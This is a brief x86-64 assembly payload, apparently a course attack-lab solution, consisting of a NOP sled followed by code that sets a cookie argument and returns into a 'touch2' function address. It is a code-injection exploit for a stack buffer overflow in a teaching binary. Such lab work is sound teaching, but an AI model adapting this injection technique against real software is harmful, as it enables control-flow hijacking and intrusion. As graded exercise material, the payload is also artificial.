nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov  $0x59b997fa, %edi # Set arg1 = cookie
pushq $0x4017ec				 # push the address of touch2 in the stack
retq									 # return to addr of touch2
